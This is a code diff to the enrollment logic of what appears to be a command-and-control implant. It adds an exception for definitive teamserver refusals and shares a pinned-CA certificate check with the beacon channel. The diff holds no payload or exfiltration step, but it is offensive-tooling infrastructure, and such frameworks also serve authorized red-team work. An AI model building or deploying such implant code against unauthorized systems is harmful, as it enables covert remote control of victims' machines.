@@ -113,6 +113,13 @@ internal sealed class Enrollment
 /// which server identity to accept over the enroll TLS connection (empty trusts
 /// the system roots).
 /// </summary>
+/// <remarks>
+/// A definitive refusal surfaces as <see cref="EnrollRejectedException"/> (bad,
+/// spent, or expired token, malformed response): retrying would not change that
+/// answer, so the caller fails fast instead of walking the retry backoff.
+/// Transport failures surface as the underlying exception and are worth
+/// retrying.
+/// </remarks>
 internal static class C2
 {
     public static async Task<Enrollment> EnrollAsync(
@@ -194,12 +201,12 @@ internal static class C2
         // The teamserver returns 200 on OK and 401 on a token failure, both with
         // an EnrollmentResponse body. Read the body either way.
         var er = await response.Content.ReadFromJsonAsync<EnrollResponse>(cancellationToken: cancellationToken)
-            ?? throw new InvalidOperationException("enroll returned an empty body");
+            ?? throw new EnrollRejectedException("enroll returned an empty body");
         if (er.Status != EnrollStatus.Ok)
-            throw new InvalidOperationException($"enroll rejected: status {er.Status}");
+            throw new EnrollRejectedException($"enroll rejected: status {er.Status}");
 
         var leafDer = Convert.FromBase64String(er.LeafCertificate
-            ?? throw new InvalidOperationException("enroll OK but missing leafCertificate"));
+            ?? throw new EnrollRejectedException("enroll OK but missing leafCertificate"));
         // .NET 10 obsoleted the X509Certificate2(byte[]) ctor (SYSLIB0057); the
         // loader is the supported path for parsing a DER cert.
         var leaf = X509CertificateLoader.LoadCertificate(leafDer);
@@ -228,14 +235,21 @@ internal static class C2
         };
     }
 
+    /// <summary>
+    /// Thrown for a definitive enroll refusal (bad/spent/expired token,
+    /// malformed response): retrying would not change the answer.
+    /// </summary>
+    internal sealed class EnrollRejectedException(string message) : Exception(message);
+
     // Accepts the peer certificate iff it chains to one of the pinned CAs. The
     // dev teamserver presents the CA certificate itself as its server identity
     // (TransportHost.ConfigureMtlsHttps), and that CA cert carries no Subject
     // Alternative Names -- standard TLS name verification would reject it. The
     // implant pins the CA explicitly, so the security property is
-    // chain-to-pinned-CA, not DNS name match -- the same shape the C# beacon
-    // client and the Go implant use.
-    private static bool PinServerChain(
+    // chain-to-pinned-CA, not DNS name match -- the same shape the server side
+    // uses (ClientCertificateChainsToCa). Shared by the enroll client and the
+    // beacon channel.
+    internal static bool PinServerChain(
         X509Certificate2? certificate,
         X509Chain? chain,
         X509Certificate2Collection pinned)
